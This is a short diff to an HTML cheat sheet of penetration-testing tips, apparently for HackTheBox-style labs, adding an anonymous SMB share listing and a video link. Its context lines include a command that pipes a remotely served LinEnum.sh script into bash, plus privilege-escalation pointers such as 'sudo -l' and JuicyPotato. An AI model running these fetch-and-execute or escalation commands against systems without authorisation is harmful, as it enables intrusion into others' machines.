@@ -28,6 +28,11 @@ usefull tips and tools for hacking
   <li> curl IP:PORT/LinEnum.sh | bash
 </ul>
 
+<b>SMB scan</b>
+<ul>
+  <li> smbclient -N //ip/sharename
+</ul>
+
 <b>Priv Esc</b>
 <ul>
   <li> sudo -l
@@ -52,4 +57,5 @@ usefull tips and tools for hacking
 <ul>
   <li> juicypotato windows priv esc - Conceal https://www.youtube.com/watch?v=1ae64CdwLHE
   <li> setuid viewuser - Irked https://www.youtube.com/watch?v=OGFTM_qvtVI
+  <li> hackthebox squid server - https://www.youtube.com/watch?v=5wyvpJa9LdU
 </ul>
